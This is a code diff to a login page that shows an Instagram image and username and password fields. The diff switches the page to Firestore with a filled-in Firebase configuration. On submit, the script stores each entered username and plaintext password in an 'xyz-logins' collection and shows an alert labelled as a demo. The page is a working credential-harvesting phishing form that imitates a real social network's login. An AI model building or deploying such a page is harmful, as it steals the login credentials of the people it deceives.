@@ -19,6 +19,7 @@
             padding: 40px;
             text-align: center;
             width: 300px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
         input {
             display: block;
@@ -37,15 +38,17 @@
             cursor: pointer;
             margin-top: 10px;
         }
+        button:hover {
+            background: #0073e6;
+        }
     </style>
     <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 </head>
 <body>
     <div class="login-box">
-        <!-- <h2>XYZ Social Media</h2> -->
-        <img src="./instagram.png" width="200px" height="200px"></img>
+        <img src="./instagram.png" width="200px" height="200px">
         <form id="loginForm">
             <input type="text" id="username" placeholder="Enter Username" required>
             <input type="password" id="password" placeholder="Enter Password" required>
@@ -53,42 +56,39 @@
         </form>
     </div>
 
-    <script type="module">
+    <script>
         // Your Firebase configuration
         const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-            databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_PROJECT_ID.appspot.com",
-            messagingSenderId: "YOUR_SENDER_ID",
-            appId: "YOUR_APP_ID"
+            apiKey: "AIzaSyByKSUsC642IfINWogTnw2XskTgk6HXnX4",
+            authDomain: "xyz-social-demo.firebaseapp.com",
+            projectId: "xyz-social-demo",
+            storageBucket: "xyz-social-demo.firebasestorage.app",
+            messagingSenderId: "588536202737",
+            appId: "1:588536202737:web:b8d4f4412a357245a37050",
+            measurementId: "G-T2TMB8B5R1"
         };
 
         // Initialize Firebase
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-
-        // Form submission
-        const form = document.getElementById("loginForm");
-        form.addEventListener("submit", (e) => {
+        // Form submission handler
+        document.getElementById("loginForm").addEventListener("submit", function (e) {
             e.preventDefault();
 
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // Push data to Firebase
-            push(ref(db, "xyz-logins"), {
+            db.collection("xyz-logins").add({
                 username: username,
                 password: password,
-                timestamp: new Date().toISOString()
+                timestamp: new Date()
+            }).then(() => {
+                alert("Demo: Data saved to Firestore!");
+                document.getElementById("loginForm").reset();
+            }).catch((error) => {
+                console.error("Error saving data: ", error);
             });
-
-            alert("Demo: Data stored in Firebase!");
-            form.reset();
         });
     </script>
 </body>
